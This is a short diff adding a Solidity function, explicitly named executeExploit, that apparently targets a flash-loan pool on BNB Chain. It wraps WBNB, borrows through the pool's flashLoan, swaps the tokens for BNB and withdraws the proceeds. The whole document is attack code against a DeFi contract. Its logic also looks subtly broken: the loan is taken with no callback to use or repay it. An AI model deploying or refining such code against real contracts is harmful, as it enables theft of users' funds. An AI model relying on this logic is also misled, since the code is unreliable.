@@ -1,0 +1,33 @@
+``` 
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // 1. Obtain the WBNB balance and deposit it
+    IWBNB wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    wbnb.deposit{value: amount}();
+
+    // 2. Approve the valuable token for the DPP contract
+    valuableToken.approve(target, type(uint256).max);
+
+    // 3. Flash loan the amount of valuable tokens
+    IDPP(target).flashLoan(amount, 0, address(this), "");
+
+    // 4. We need the DPP contract to execute a swap for WBNB
+    uint256 valuableTokensToSwap = valuableToken.balanceOf(address(this));
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(wbnb);
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        valuableTokensToSwap, 
+        0, // amountOutMin
+        path, 
+        address(this), 
+        block.timestamp
+    );
+
+    // 5. Withdraw the WBNB back to the original account
+    uint256 wbnbBalance = wbnb.balanceOf(address(this));
+    wbnb.withdraw(wbnbBalance);
+}
+</executeExploitCode>
+```
